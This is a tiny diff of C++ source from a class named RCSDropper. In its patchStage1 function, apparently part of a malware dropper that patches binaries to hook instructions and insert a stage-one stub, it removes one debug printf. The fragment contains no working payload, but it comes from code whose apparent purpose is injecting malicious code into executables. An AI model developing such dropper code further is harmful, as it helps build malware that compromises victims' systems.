@@ -60,7 +60,6 @@ void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD stubVA)
         break;
         case CallType:
         {
-	    printf("LEN => %08x\n", hookedInstruction_.len);
             if (hookedInstruction_.len == 5)
 	    {
 	            // account for initial 4 bytes containing address of next byte
